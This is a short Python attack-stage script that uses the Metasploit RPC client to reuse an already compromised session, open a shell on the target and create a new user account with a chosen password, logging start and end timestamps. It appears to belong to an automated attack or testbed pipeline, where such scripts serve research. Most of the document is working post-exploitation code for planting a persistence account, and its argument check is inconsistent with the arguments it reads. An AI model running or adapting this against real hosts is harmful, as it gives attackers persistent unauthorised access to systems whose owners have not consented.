import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    new_user_account = argv[4]
    new_user_password = argv[5]

    client = MsfRpcClient('kali')

    time.sleep(2)
    output_time_file = 'time_stage_2_start.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)

    shell = client.sessions.session('2')
    shell.run_with_output('shell')
    # shell.write('useradd -p $(openssl passwd -1 password) test') # cremetest:password
    shell.write('useradd -p $(openssl passwd -1 {0}) {1}'.format(new_user_password, new_user_account))

    time.sleep(10)
    output_time_file = 'time_stage_2_end.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)


main(sys.argv)
